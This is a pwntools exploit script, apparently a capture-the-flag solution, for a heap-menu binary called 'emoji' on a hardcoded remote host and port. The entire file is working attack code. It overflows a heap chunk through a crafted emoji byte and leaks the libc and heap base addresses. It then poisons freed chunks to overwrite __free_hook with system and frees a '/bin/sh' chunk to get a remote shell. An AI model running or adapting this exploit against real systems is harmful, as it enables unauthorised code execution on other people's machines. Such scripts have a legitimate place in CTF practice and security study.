7#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x98+1100+0', '-e']
context.log_level = 'info'

def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]


exe = ELF('./emoji')
libc = ELF('./libc.so.6')
rop = ROP(exe)

host, port = "193.57.159.27", "32994"
#host, port = "127.0.0.1", "1337"

def add_emoji(title,emoji,data, big=0):
  if (big==1):
    p.sendlineafter('> ', '0'*5000+'1')
  else:
    p.sendlineafter('> ', '1')
  p.sendafter('title: ', title)
  p.sendafter('emoji: ', chr(emoji)+data)

def read_emoji(index):
  p.sendlineafter('> ', '2')
  p.sendlineafter('index to read: ', str(index))

def delete_emoji(index):
  p.sendlineafter('> ', '3')
  p.sendlineafter('index to delete: ', str(index))

def collect_garbage():
  p.sendlineafter('> ', '4')


if args.REMOTE:
  p = remote(host,port)
else:
  if args.GDB:
    p = gdb.debug([exe.path], gdbscript = '''
    source ~/gdb.plugins/gef/gef.py
    tbreak main
    c
    pie breakpoint *0x1672
    c
     ''')
  else:
    p = process(exe.path)


if args.GDB:
  pause()

for i in range(10):
  add_emoji('A',0xf0, 'BBB')


for i in range(10):
  delete_emoji(i)


collect_garbage()

add_emoji('X',0xf8, '000\xd8', 1)
read_emoji(0)

p.recvuntil('Title: ',drop=True)
libc.address = u64(p.recvuntil('\n', drop=True).ljust(8,b'\x00')) - 0x1ebbf0
print('libc base = {:#x}'.format(libc.address))

add_emoji('A',0xf0, '000')
read_emoji(1)
p.recvuntil('Title: ',drop=True)
heap_base = u64(p.recvuntil('\n', drop=True).ljust(8,b'\x00')) - 0x1541
print('heap base = {:#x}'.format(heap_base))

fake = b'A'*0x58+p64(0x91)+p64(libc.symbols['__free_hook'])

add_emoji(fake,0xf0, '000')
add_emoji('C',0xfc, '000'+p16((heap_base + 0x15f0 ) & 0xffff))

delete_emoji(1)
delete_emoji(2)
delete_emoji(3)
collect_garbage()

fake2 = p64(0)*5+ p64(0x21) + p64(heap_base+0x16c0) + p64(libc.address+0x1ebbf0) + p64(0x20) +p64(0x90) +p64(libc.symbols['__free_hook'])
add_emoji(fake2,0xf0, '000')

add_emoji('/bin/sh',0xf0, '000')
add_emoji('/bin/sh',0xf0, '000')
add_emoji(p64(libc.symbols['system']),0xf0, '000')

delete_emoji(3)
collect_garbage()

p.interactive()
